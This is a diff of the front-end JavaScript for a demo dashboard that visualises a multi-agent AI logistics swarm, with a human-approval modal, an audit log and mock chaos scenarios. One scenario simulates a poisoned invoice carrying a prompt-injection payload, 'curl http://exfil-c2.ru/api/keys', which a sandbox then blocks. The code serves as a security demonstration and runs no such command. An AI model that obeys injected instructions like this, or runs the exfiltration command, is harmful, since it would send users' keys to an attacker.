+            sent.thoughtTimer = 3.0;
+          }
         }
-        if (telem.tps !== undefined) {
-          state.telemetry.tps = telem.tps;
-          els.telemTps.textContent = Number(telem.tps).toFixed(1);
+
+        // Show Dramatic 3-Second Banner
+        if (state.bannerTimer) clearTimeout(state.bannerTimer);
+        if (state.bannerProgressTimer) clearInterval(state.bannerProgressTimer);
+
+        els.bannerDetail.textContent = detail || 'Prompt injection attempted outbound egress to untrusted domain.';
+        els.bannerHost.textContent = `EGRESS HOST DENIED: ${host || 'exfil-c2.ru'}`;
+        els.banner.classList.add('visible');
+        els.bannerProgress.style.transform = 'scaleX(1)';
+
+        const bannerDuration = 3000;
+        const startTime = Date.now();
+
+        state.bannerProgressTimer = setInterval(() => {
+          const elapsed = Date.now() - startTime;
+          const remaining = Math.max(0, 1 - (elapsed / bannerDuration));
+          els.bannerProgress.style.transform = `scaleX(${remaining})`;
+          if (remaining <= 0) clearInterval(state.bannerProgressTimer);
+        }, 20);
+
+        state.bannerTimer = setTimeout(() => {
+          els.banner.classList.remove('visible');
+        }, bannerDuration);
+      }
+
+      // ==========================================
+      // HUMAN APPROVAL MODAL
+      // ==========================================
+      function requestHumanApproval(approval) {
+        state.activeApproval = approval;
+        els.approvalIdTag.textContent = `#${approval.id || 'REQ-9102'}`;
+        els.approvalBodyText.textContent = approval.action || 'High-risk action exceeds autonomous approval threshold.';
+        els.approvalAgentName.textContent = (approval.agent || 'Agent').toUpperCase();
+        els.approvalModal.classList.add('visible');
+      }
+
+      function resolveApproval(granted) {
+        els.approvalModal.classList.remove('visible');
+        if (state.activeApproval) {
+          const id = state.activeApproval.id;
+          if (!state.isMock) {
+            fetch(granted ? `/approve/${id}` : `/deny/${id}`, { method: 'POST' }).catch(() => {});
+          }
+          handleMessage({
+            id: 'appr-resp-' + Date.now(),
+            t: Date.now(),
+            type: 'action',
+            agent: state.activeApproval.agent,
+            tool: granted ? 'approval_granted' : 'approval_denied',
+            detail: granted ? `Human approved: ${state.activeApproval.action}` : `Action rejected by human supervisor.`
+          });
+          state.activeApproval = null;
         }
       }
 
-      function updateSystem(sys) {
-        if (sys.model) {
-          state.telemetry.model = sys.model;
-          els.telemModel.textContent = sys.model;
-        }
-        if (sys.memUsedGB !== undefined && sys.memTotalGB !== undefined) {
-          state.telemetry.memUsedGB = sys.memUsedGB;
-          state.telemetry.memTotalGB = sys.memTotalGB;
-          els.telemMem.textContent = `${Number(sys.memUsedGB).toFixed(1)} / ${Number(sys.memTotalGB).toFixed(1)} GB`;
-          const pct = Math.min(100, Math.max(5, (sys.memUsedGB / sys.memTotalGB) * 100));
-          els.memFill.style.width = `${pct}%`;
-        }
-      }
+      els.btnApprove.addEventListener('click', () => resolveApproval(true));
+      els.btnDeny.addEventListener('click', () => resolveApproval(false));
 
       // ==========================================
-      // MESSAGE PROCESSOR (Real SSE or Mock)
+      // MESSAGE PROCESSOR (v1 + v2 Compatible)
       // ==========================================
       function handleMessage(msg) {
         if (!msg || typeof msg !== 'object') return;
 
-        // Sync stats if provided
         if (msg.stats) {
           for (const k in msg.stats) {
-            if (state.stats.hasOwnProperty(k)) {
-              state.stats[k] = msg.stats[k];
-            }
+            if (state.stats.hasOwnProperty(k)) state.stats[k] = msg.stats[k];
           }
         }
 
         const type = msg.type;
-        const agent = (msg.agent || '').toLowerCase();
+        const agentId = (msg.agent || '').toLowerCase();
+        const robot = robots.find(r => r.id === agentId);
 
-        // 1. "event": Event Stream -> Agent pulse + highlight agent
+        // 1. "event"
         if (type === 'event') {
           AudioEngine.playBlip(720, 0.03, 'sine', 0.02);
-          flashNode('stream', 'highlight-event', 400);
-
-          let pathId = 'path-stream-procurement';
-          if (agent === 'support') pathId = 'path-stream-support';
-          else if (agent === 'dispatch') pathId = 'path-stream-dispatch';
-
-          spawnPulse(pathId, '#00f0ff', 'url(#glow-cyan)', 1.2, () => {
-            flashNode(agent, 'highlight-event', 800);
-            updateAgentStatus(agent, msg.kind || 'Processing Event');
-          });
-
+          shootPneumaticCapsule(130, 110, robot ? robot.currX : 480, robot ? robot.currY : 280, '#00f0ff');
+          if (robot) {
+            robot.pulseGlow = 1.0;
+            robot.toolDisplay = msg.kind || 'Inbound Event';
+            robot.thoughtTimer = 2.0;
+          }
           addLogItem(msg);
         }
 
-        // 2. "action": Agent -> Sandbox Policy green pulse + tool display
+        // 2. "action"
         else if (type === 'action') {
           AudioEngine.playBlip(960, 0.04, 'sine', 0.02);
-          let pathId = 'path-procurement-sandbox';
-          if (agent === 'support') pathId = 'path-support-sandbox';
-          else if (agent === 'dispatch') pathId = 'path-dispatch-sandbox';
-
-          flashNode(agent, 'highlight-action', 600);
-          updateAgentStatus(agent, msg.tool ? `tool: ${msg.tool}` : 'Executed Action');
-
-          spawnPulse(pathId, '#00ff88', 'url(#glow-green)', 1.4, () => {
-            flashNode('sandbox', 'highlight-action', 500);
-          });
-
+          if (robot) {
+            robot.pulseGlow = 1.0;
+            robot.toolDisplay = msg.tool ? `${msg.tool}()` : 'Action';
+            robot.thoughtTimer = 2.5;
+          }
           addLogItem(msg);
         }
 
-        // 3. "handoff": from -> to yellow pulse
+        // 3. "handoff"
         else if (type === 'handoff') {
           AudioEngine.playBlip(620, 0.05, 'triangle', 0.025);
-          const from = (msg.from || '').toLowerCase();
-          const to = (msg.to || '').toLowerCase();
+          const fromBot = robots.find(r => r.id === (msg.from || '').toLowerCase());
+          const toBot = robots.find(r => r.id === (msg.to || '').toLowerCase());
 
-          flashNode(from, 'highlight-handoff', 700);
-          updateAgentStatus(from, `Handoff -> ${to}`);
-
-          let pathId = `path-${from}-${to}`;
-          if (!document.getElementById(pathId)) {
-            // fallback
-            pathId = 'path-support-procurement';
+          if (fromBot && toBot) {
+            fromBot.pulseGlow = 0.8;
+            toBot.pulseGlow = 0.8;
+            fromBot.toolDisplay = `Handover -> ${toBot.name}`;
+            toBot.toolDisplay = `Received from ${fromBot.name}`;
+            fromBot.thoughtTimer = 2.5;
+            toBot.thoughtTimer = 2.5;
+            shootPneumaticCapsule(fromBot.currX, fromBot.currY - 20, toBot.currX, toBot.currY - 20, '#ff9900');
           }
-
-          spawnPulse(pathId, '#ffb700', 'url(#glow-amber)', 1.1, () => {
-            flashNode(to, 'highlight-handoff', 800);
-            updateAgentStatus(to, `Received from ${from}`);
-          });
-
-          msg.detail = msg.detail || `Inter-agent handoff of freight task from ${from} to ${to}`;
+          msg.detail = msg.detail || `Handoff from ${msg.from} to ${msg.to}`;
           addLogItem(msg);
         }
 
-        // 4. "blocked": dramatic quarantine incident
+        // 4. "plan" (Incident DAG)
+        else if (type === 'plan') {
+          state.activePlan = msg;
+          els.dagPlanIndicator.textContent = `Plan: ${msg.incident || 'Active DAG'}`;
+          els.valEscalated.textContent = (++state.stats.escalated).toString();
+
+          const orch = robots.find(r => r.id === 'orchestrator');
+          if (orch) {
+            orch.pulseGlow = 1.0;
+            orch.toolDisplay = 'PLANNING DAG';
+            orch.thoughtTimer = 3.0;
+          }
+          addLogItem({
+            ...msg,
+            detail: `Orchestrator synthesized ${msg.steps.length}-step DAG plan for ${msg.incident}`
+          });
+        }
+
+        // 5. "step"
+        else if (type === 'step') {
+          if (state.activePlan && state.activePlan.steps) {
+            const st = state.activePlan.steps.find(s => s.id === msg.stepId);
+            if (st) st.status = msg.status;
+          }
+          if (robot) {
+            robot.pulseGlow = 0.9;
+            robot.toolDisplay = `Step: ${msg.status}`;
+            robot.thoughtTimer = 2.0;
+          }
+        }
+
+        // 6. "approval"
+        else if (type === 'approval') {
+          requestHumanApproval(msg);
+          addLogItem(msg);
+        }
+
+        // 7. "audit"
+        else if (type === 'audit') {
+          state.auditSeq = msg.seq || (state.auditSeq + 1);
+          els.valHashChain.textContent = `#${state.auditSeq}`;
+          const aud = robots.find(r => r.id === 'auditor');
+          if (aud) {
+            aud.pulseGlow = 0.8;
+            aud.toolDisplay = 'HASH VERIFIED';
+            aud.thoughtTimer = 2.0;
+          }
+          addLogItem(msg);
+        }
+
+        // 8. "blocked"
         else if (type === 'blocked') {
-          let pathId = 'path-procurement-sandbox';
-          if (agent === 'support') pathId = 'path-support-sandbox';
-          else if (agent === 'dispatch') pathId = 'path-dispatch-sandbox';
-
-          flashNode(agent, 'highlight-blocked', 1200);
-          updateAgentStatus(agent, 'BLOCKED VIOLATION');
-
-          spawnPulse(pathId, '#ff2a55', 'url(#glow-red)', 1.8, () => {
-            triggerBlockedSequence(agent, msg.host, msg.detail);
-          });
-
+          triggerBlockedSequence(agentId, msg.host, msg.detail);
           addLogItem(msg);
         }
 
-        // 5. "telemetry": model latency & tps
+        // 9. "telemetry" & "sys"
         else if (type === 'telemetry') {
-          updateTelemetry(msg);
-        }
-
-        // 6. "sys": memory & model name
-        else if (type === 'sys') {
-          updateSystem(msg);
-        }
-
-        // 7. "error": agent execution fault
-        else if (type === 'error') {
+          if (msg.ms) els.telemLatency.textContent = msg.ms;
+          if (msg.tps) els.telemTps.textContent = Number(msg.tps).toFixed(1);
+        } else if (type === 'sys') {
+          if (msg.memUsedGB && msg.memTotalGB) {
+            els.telemMem.textContent = `${Number(msg.memUsedGB).toFixed(1)} / ${Number(msg.memTotalGB).toFixed(1)} GB`;
+            els.memFill.style.width = `${Math.min(100, (msg.memUsedGB / msg.memTotalGB) * 100)}%`;
+          }
+        } else if (type === 'error') {
           AudioEngine.playBlip(220, 0.08, 'sawtooth', 0.04);
-          if (agent) flashNode(agent, 'highlight-blocked', 900);
           addLogItem(msg);
         }
       }
 
       // ==========================================
-      // REAL BACKEND CONNECTION & MOCK FALLBACK
+      // REAL BACKEND & MOCK SIMULATOR
       // ==========================================
       let sse = null;
       let connectedToReal = false;
@@ -2060,137 +2583,64 @@
 
       function initConnection() {
         if (forceMock) {
-          enableMockMode('Requested via ?mock=1 URL parameter');
+          enableMockMode('Explicit ?mock=1 parameter');
           return;
         }
 
-        let connectTimeout = setTimeout(() => {
-          if (!connectedToReal) {
-            console.warn('[MissionControl] SSE /events timeout (2000ms), failing over to MOCK MODE.');
-            enableMockMode('Connection timeout to /events (2s)');
-          }
+        const timeout = setTimeout(() => {
+          if (!connectedToReal) enableMockMode('Timeout connecting to /events');
         }, 2000);
 
         try {
           sse = new EventSource('/events');
-
           sse.onopen = () => {
             connectedToReal = true;
-            clearTimeout(connectTimeout);
-            console.log('[MissionControl] Connected to live SSE at /events');
+            clearTimeout(timeout);
           };
-
           sse.onmessage = (e) => {
             connectedToReal = true;
-            clearTimeout(connectTimeout);
-            try {
-              const data = JSON.parse(e.data);
-              handleMessage(data);
-            } catch (err) {
-              console.error('[MissionControl] Failed to parse SSE JSON:', err);
-            }
+            clearTimeout(timeout);
+            try { handleMessage(JSON.parse(e.data)); } catch (err) {}
           };
-
-          sse.onerror = (err) => {
+          sse.onerror = () => {
             if (!connectedToReal) {
-              clearTimeout(connectTimeout);
-              console.warn('[MissionControl] SSE error before connection, engaging MOCK MODE:', err);
+              clearTimeout(timeout);
               enableMockMode('SSE connection failed');
             }
           };
         } catch (e) {
-          clearTimeout(connectTimeout);
-          enableMockMode('Exception initializing EventSource');
+          clearTimeout(timeout);
+          enableMockMode('Exception initializing SSE');
         }
       }
-
-      // ==========================================
-      // REALISTIC BUILT-IN MOCK SIMULATOR
-      // ==========================================
-      const MOCK_SCENARIOS = {
-        support: [
-          { kind: 'temp_alarm', detail: 'Reefer trailer #8902 temp delta +3.8°C at Chicago Intermodal Yard' },
-          { kind: 'client_query', detail: 'Priority inquiry from Acme Corp: Expedited delivery status on PO-99124' },
-          { kind: 'claim_file', detail: 'Damaged pallet claim submitted for Denver cross-dock shipment' },
-          { kind: 'customs_hold', detail: 'Inbound LTL shipment held at Detroit Ambassador Bridge for manifest inspection' },
-          { kind: 'eta_request', detail: 'Consignee requesting emergency 1-hour delivery window at Long Beach Terminal' }
-        ],
-        procurement: [
-          { kind: 'supplier_rfq', detail: 'Dynamic spot-quote request for 4 dry-van trailers on Dallas-Atlanta lane' },
-          { kind: 'fuel_rate', detail: 'National diesel index adjustment applied: fuel surcharge reset to 24.5%' },
-          { kind: 'carrier_bid', detail: 'SwiftHaul Logistics submitted binding tender for Midwest regional routes' },
-          { kind: 'chassis_tender', detail: 'Emergency tender issued for 40ft refrigerated chassis at Memphis depot' },
-          { kind: 'part_requisition', detail: 'Approved purchase order for 12 telematics sensors at Kansas City shop' }
-        ],
-        dispatch: [
-          { kind: 'route_recalc', detail: 'Severe weather alert on I-80: automated detour initiated via US-30' },
-          { kind: 'dock_appointment', detail: 'Automated yard check-in appointment confirmed at Newark Distribution Hub' },
-          { kind: 'hos_check', detail: 'Driver hours-of-service compliance verified: 9.5 hours remaining in cycle' },
-          { kind: 'trailer_drop', detail: 'Drop-and-hook operation verified at Indianapolis distribution center' },
-          { kind: 'weight_scale', detail: 'Automated weigh-station bypass certified at Ohio turnpike checkpoint' }
-        ],
-        actions: [
-          { agent: 'support', tool: 'resolve_ticket', detail: 'Automated resolution: reefer temperature returned to setpoint' },
-          { agent: 'support', tool: 'send_email', detail: 'Sent signed BOL proof-of-delivery to consignee freight manager' },
-          { agent: 'support', tool: 'escalate', detail: 'Escalated tier-3 HAZMAT document error to compliance officer' },
-          { agent: 'procurement', tool: 'send_email', detail: 'Dispatched electronic purchase order to Apex Fuel Suppliers' },
-          { agent: 'procurement', tool: 'resolve_ticket', detail: 'Tender accepted: carrier rate locked at $2.14/mile' },
-          { agent: 'dispatch', tool: 'reroute_order', detail: 'Reassigned trailer #4401 to secondary rail ramp at BNSF Cicero' },
-          { agent: 'dispatch', tool: 'resolve_ticket', detail: 'Gate code generated and sent to driver telematics unit' }
-        ],
-        handoffs: [
-          { from: 'support', to: 'procurement', detail: 'Support escalated custom rate approval to Procurement' },
-          { from: 'procurement', to: 'dispatch', detail: 'Procurement secured carrier contract, handing off routing to Dispatch' },
-          { from: 'dispatch', to: 'support', detail: 'Dispatch updated ETA for delayed load, handing off customer alert to Support' }
-        ],
-        blocked: [
-          { agent: 'support', host: 'exfil-freight-analytics.cc', detail: 'Unauthorized webhook egress attempt to unverified external analytics server' },
-          { agent: 'procurement', host: 'supplier-shadow-portal.net', detail: 'Egress firewall blocked credential transmission to unauthorized supplier portal' },
-          { agent: 'dispatch', host: 'api.untrusted-iot-relay.biz', detail: 'Outbound raw GPS telemetry stream quarantined by local sandbox rule' }
-        ]
-      };
 
       function enableMockMode(reason) {
         if (state.isMock) return;
         state.isMock = true;
-        console.log(`[MissionControl] Simulator Active: ${reason}`);
-
-        if (sse) {
-          try { sse.close(); } catch (e) {}
-          sse = null;
-        }
-
-        // Show MOCK DATA badge
         els.mockBadge.style.display = 'inline-flex';
 
-        // Pre-seed initial state
-        state.stats.events = 42;
-        state.stats.resolved = 31;
-        state.stats.escalated = 4;
-        state.stats.rerouted = 7;
-        state.stats.blocked = 0;
-        state.stats.errors = 1;
-
-        // Seed some history logs
+        // Preload rich initial history
         handleMessage({
           id: 'init-1',
-          t: Date.now() - 15000,
+          t: Date.now() - 12000,
           type: 'event',
-          agent: 'dispatch',
+          agent: 'triage',
           kind: 'system_boot',
-          detail: 'Autonomous logistics swarm initialized on local GB10 hardware cluster.'
+          detail: 'Swarm v2 initialized across 15 robot nodes on Dell Pro Max GB10.'
         });
 
         handleMessage({
           id: 'init-2',
-          t: Date.now() - 9000,
-          type: 'action',
-          agent: 'procurement',
-          tool: 'resolve_ticket',
-          detail: 'Fuel contracts cached locally. Zero-cloud policy engaged.'
+          t: Date.now() - 6000,
+          type: 'audit',
+          seq: 142,
+          agent: 'auditor',
+          action: 'verify_genesis',
+          hash: '4f8a91c78e320d41e2b5ca08129e9bf0',
+          prevHash: '00000000000000000000000000000000',
+          detail: 'Genesis block cryptographically chained.'
         });
 
-        // Run continuous simulation loop
         startMockLoop();
       }
 
@@ -2202,263 +2652,177 @@
 
           const roll = Math.random();
 
-          // 1. Regular Event (55% chance)
-          if (roll < 0.55) {
-            const agents = ['support', 'procurement', 'dispatch'];
-            const agent = agents[Math.floor(Math.random() * agents.length)];
-            const list = MOCK_SCENARIOS[agent];
-            const item = list[Math.floor(Math.random() * list.length)];
-
+          // 1. Regular multi-agent event
+          if (roll < 0.6) {
+            const bot = robots[Math.floor(Math.random() * robots.length)];
             state.stats.events++;
             handleMessage({
               id: 'mock-evt-' + Date.now(),
               t: Date.now(),
               type: 'event',
-              agent: agent,
-              kind: item.kind,
-              detail: item.detail,
-              stats: { ...state.stats }
+              agent: bot.id,
+              kind: bot.tools[0],
+              detail: `${bot.name} executed ${bot.tools[0]} on live freight item.`
             });
           }
-          // 2. Action (25% chance)
-          else if (roll < 0.80) {
-            const act = MOCK_SCENARIOS.actions[Math.floor(Math.random() * MOCK_SCENARIOS.actions.length)];
+          // 2. Action
+          else if (roll < 0.85) {
+            const bot = robots[Math.floor(Math.random() * robots.length)];
+            const tool = bot.tools[Math.floor(Math.random() * bot.tools.length)];
             state.stats.events++;
-            if (act.tool === 'resolve_ticket') state.stats.resolved++;
-            else if (act.tool === 'escalate') state.stats.escalated++;
-            else if (act.tool === 'reroute_order') state.stats.rerouted++;
-
+            state.stats.resolved++;
             handleMessage({
               id: 'mock-act-' + Date.now(),
               t: Date.now(),
               type: 'action',
-              agent: act.agent,
-              tool: act.tool,
-              detail: act.detail,
-              stats: { ...state.stats }
+              agent: bot.id,
+              tool: tool,
+              detail: `${bot.name} finalized ${tool}() operation autonomously.`
             });
           }
-          // 3. Handoff (12% chance)
-          else if (roll < 0.92) {
-            const h = MOCK_SCENARIOS.handoffs[Math.floor(Math.random() * MOCK_SCENARIOS.handoffs.length)];
+          // 3. Inter-agent handoff
+          else {
+            const b1 = robots[Math.floor(Math.random() * robots.length)];
+            let b2 = robots[Math.floor(Math.random() * robots.length)];
+            while (b2.id === b1.id) b2 = robots[Math.floor(Math.random() * robots.length)];
+
             state.stats.events++;
             handleMessage({
               id: 'mock-hand-' + Date.now(),
               t: Date.now(),
               type: 'handoff',
-              from: h.from,
-              to: h.to,
-              detail: h.detail,
-              stats: { ...state.stats }
-            });
-          }
-          // 4. Occasional Blocked Egress (5% chance)
-          else if (roll < 0.97) {
-            const b = MOCK_SCENARIOS.blocked[Math.floor(Math.random() * MOCK_SCENARIOS.blocked.length)];
-            state.stats.events++;
-            state.stats.blocked++;
-            handleMessage({
-              id: 'mock-blk-' + Date.now(),
-              t: Date.now(),
-              type: 'blocked',
-              agent: b.agent,
-              host: b.host,
-              detail: b.detail,
-              stats: { ...state.stats }
-            });
-          }
-          // 5. Minor Execution Warning / Error (3% chance)
-          else {
-            state.stats.events++;
-            state.stats.errors++;
-            handleMessage({
-              id: 'mock-err-' + Date.now(),
-              t: Date.now(),
-              type: 'error',
-              agent: 'dispatch',
-              detail: 'EDI 204 load tender segment parser encountered minor syntax warning.',
-              stats: { ...state.stats }
+              from: b1.id,
+              to: b2.id,
+              detail: `${b1.name} transferred container task to ${b2.name}.`
             });
           }
 
-          // Randomize telemetry fluctuations
-          const ms = Math.floor(95 + Math.random() * 85);
-          const tps = Number((78 + Math.random() * 22).toFixed(1));
-          const mem = Number((24.2 + (Math.sin(Date.now() / 20000) * 2.4)).toFixed(1));
+          // Fluctuations
+          const ms = Math.floor(100 + Math.random() * 65);
+          const tps = Number((82 + Math.random() * 16).toFixed(1));
+          const mem = Number((24.2 + Math.sin(Date.now() / 15000) * 1.8).toFixed(1));
+          els.telemLatency.textContent = ms;
+          els.telemTps.textContent = tps;
+          els.telemMem.textContent = `${mem} / 128.0 GB`;
 
-          updateTelemetry({ ms, tps });
-          updateSystem({ memUsedGB: mem, memTotalGB: 128.0, model: 'NemoClaw-70B (Local GB10)' });
-
-        }, 1200 + Math.random() * 600);
+        }, 1300 + Math.random() * 600);
       }
 
       // ==========================================
-      // CHAOS BURSTS (Simulated or Real POST)
+      // CHAOS MULTI-AGENT SCENARIOS
       // ==========================================
-      function postChaos(endpoint, mockBurstFn) {
+      function postChaos(endpoint, fallbackFn) {
         if (state.isMock) {
-          mockBurstFn();
+          fallbackFn();
         } else {
-          // Real backend fetch
-          fetch(endpoint, { method: 'POST' }).catch((err) => {
-            console.warn(`[MissionControl] POST ${endpoint} failed, executing local fallback burst:`, err);
-            mockBurstFn();
-          });
+          fetch(endpoint, { method: 'POST' }).catch(() => fallbackFn());
         }
       }
 
-      // 1. Supplier Failure Chaos
-      function triggerChaosSupplier() {
-        els.btnChaosSupplier.style.transform = 'scale(0.96)';
-        setTimeout(() => els.btnChaosSupplier.style.transform = '', 150);
-
+      // 1. Port Strike Multi-Agent Incident
+      els.btnChaosSupplier.addEventListener('click', () => {
         postChaos('/chaos/supplier', () => {
-          console.log('[Chaos] Triggered Supplier Failure Burst');
-          state.stats.events += 4;
-          state.stats.escalated += 2;
-          state.stats.rerouted += 2;
-
           handleMessage({
-            id: 'chaos-sup-1',
-            t: Date.now(),
-            type: 'event',
-            agent: 'procurement',
-            kind: 'supplier_failure',
-            detail: 'CRITICAL: Prime chassis supplier bankrupt in Midwest sector! 18 containers stranded.',
-            stats: { ...state.stats }
+            type: 'plan',
+            incident: 'Port Strike & Chassis Shortage',
+            steps: [
+              { id: 'step-1', agent: 'triage', status: 'done' },
+              { id: 'step-2', agent: 'procurement', status: 'running' },
+              { id: 'step-3', agent: 'customs', status: 'running' },
+              { id: 'step-4', agent: 'dispatch', status: 'pending' },
+              { id: 'step-5', agent: 'finance', status: 'pending' }
+            ]
           });
 
+          // Trigger high-risk approval
           setTimeout(() => {
             handleMessage({
-              id: 'chaos-sup-2',
-              t: Date.now(),
-              type: 'handoff',
-              from: 'procurement',
-              to: 'dispatch',
-              detail: 'Procurement requested emergency fleet redirection for stranded containers'
+              type: 'approval',
+              id: 'REQ-4098',
+              agent: 'procurement',
+              action: 'Procurement requests approval for $14,200 spot-market chassis lease.'
             });
-          }, 450);
-
-          setTimeout(() => {
-            handleMessage({
-              id: 'chaos-sup-3',
-              t: Date.now(),
-              type: 'action',
-              agent: 'dispatch',
-              tool: 'reroute_order',
-              detail: 'Autonomous dispatch reallocated 6 reserve tractors from Chicago yard.'
-            });
-          }, 900);
+          }, 800);
         });
-      }
+      });
 
-      // 2. Ticket Surge Chaos
-      function triggerChaosSurge() {
-        els.btnChaosSurge.style.transform = 'scale(0.96)';
-        setTimeout(() => els.btnChaosSurge.style.transform = '', 150);
+      // 2. Cold Chain Failure Incident
+      els.btnChaosColdchain.addEventListener('click', () => {
+        postChaos('/chaos/coldchain', () => {
+          handleMessage({
+            type: 'plan',
+            incident: 'Cold Chain Reefer Failure (+4.2°C)',
+            steps: [
+              { id: 'cc-1', agent: 'telematics', status: 'done' },
+              { id: 'cc-2', agent: 'dispatch', status: 'running' },
+              { id: 'cc-3', agent: 'warehouse', status: 'running' },
+              { id: 'cc-4', agent: 'support', status: 'pending' }
+            ]
+          });
+        });
+      });
 
+      // 3. Ticket Surge
+      els.btnChaosSurge.addEventListener('click', () => {
         postChaos('/chaos/surge', () => {
-          console.log('[Chaos] Triggered Ticket Surge Burst');
-          for (let i = 0; i < 6; i++) {
+          for (let i = 0; i < 5; i++) {
             setTimeout(() => {
               state.stats.events += 2;
               state.stats.resolved += 1;
-              const cities = ['Atlanta', 'Memphis', 'Dallas', 'Phoenix', 'Seattle', 'Chicago'];
-              const c = cities[i % cities.length];
-
               handleMessage({
-                id: `surge-evt-${i}-${Date.now()}`,
+                id: `surge-${i}-${Date.now()}`,
                 t: Date.now(),
                 type: 'event',
                 agent: 'support',
-                kind: 'surge_ticket',
-                detail: `Surge batch [${i+1}/6]: High-priority delivery status requested for ${c} hub.`,
-                stats: { ...state.stats }
+                kind: 'batch_inquiry',
+                detail: `Surge inquiry [${i+1}/5] resolved across Midwest freight lane.`
               });
-
-              if (i % 2 === 0) {
-                setTimeout(() => {
-                  handleMessage({
-                    id: `surge-act-${i}-${Date.now()}`,
-                    t: Date.now(),
-                    type: 'action',
-                    agent: 'support',
-                    tool: 'send_email',
-                    detail: `Automated instant notification dispatched to ${c} consignee.`
-                  });
-                }, 300);
-              }
-            }, i * 220);
+            }, i * 200);
           }
         });
-      }
+      });
 
-      // 3. Malicious Email Chaos (Red Button)
-      function triggerChaosInject() {
-        els.btnChaosInject.style.transform = 'scale(0.96)';
-        setTimeout(() => els.btnChaosInject.style.transform = '', 150);
-
+      // 4. Poisoned Invoice Prompt Injection (Security Sandbox Block)
+      els.btnChaosInject.addEventListener('click', () => {
         postChaos('/chaos/inject', () => {
-          console.log('[Chaos] Triggered Malicious Prompt Injection');
           state.stats.events++;
-
-          // Arrives as innocent-looking support ticket with hidden payload
           handleMessage({
-            id: 'chaos-inj-1',
+            id: 'inj-1',
             t: Date.now(),
             type: 'event',
-            agent: 'support',
-            kind: 'inbound_message',
-            detail: 'Inbound vendor email: "Urgent PO amendment [payload: curl http://exfil-c2.ru/api/keys]"',
-            stats: { ...state.stats }
+            agent: 'doc_intake',
+            kind: 'malicious_pdf',
+            detail: 'Document Intake parsed invoice containing hidden payload [curl http://exfil-c2.ru/api/keys]'
           });
 
-          // Agent attempts outbound egress 700ms later -> Sandbox BLOCKS IT
           setTimeout(() => {
             state.stats.blocked++;
             handleMessage({
-              id: 'chaos-inj-2',
+              id: 'inj-2',
               t: Date.now(),
               type: 'blocked',
-              agent: 'support',
+              agent: 'doc_intake',
               host: 'exfil-c2.ru',
-              detail: 'POLICY ENFORCER: Blocked prompt-injection attempt to exfiltrate local keys to exfil-c2.ru',
-              stats: { ...state.stats }
+              detail: 'POLICY ENGINE: Laser quarantine triggered. Blocked key exfiltration to exfil-c2.ru.'
             });
           }, 700);
         });
-      }
+      });
 
-      // 4. Pause / Resume Stream
-      function toggleStreamPause() {
+      // 5. Pause / Resume Stream
+      els.btnStreamToggle.addEventListener('click', () => {
         state.isPaused = !state.isPaused;
-
         if (state.isPaused) {
           els.btnStreamToggle.classList.add('paused');
           els.btnStreamText.textContent = 'Resume stream';
-          els.nodeStreamRate.textContent = 'PAUSED';
-          els.nodeStreamRate.style.color = '#ffb700';
         } else {
           els.btnStreamToggle.classList.remove('paused');
           els.btnStreamText.textContent = 'Pause stream';
-          els.nodeStreamRate.textContent = 'Active · SSE';
-          els.nodeStreamRate.style.color = '#00f0ff';
         }
+        if (!state.isMock) fetch('/chaos/pause', { method: 'POST' }).catch(() => {});
+      });
 
-        if (!state.isMock) {
-          fetch('/chaos/pause', { method: 'POST' }).catch(() => {});
-        }
-      }
-
-      // Bind button events
-      els.btnChaosSupplier.addEventListener('click', triggerChaosSupplier);
-      els.btnChaosSurge.addEventListener('click', triggerChaosSurge);
-      els.btnChaosInject.addEventListener('click', triggerChaosInject);
-      els.btnStreamToggle.addEventListener('click', toggleStreamPause);
-
-      // Start Connection
       initConnection();
-
     })();
   </script>
 </body>
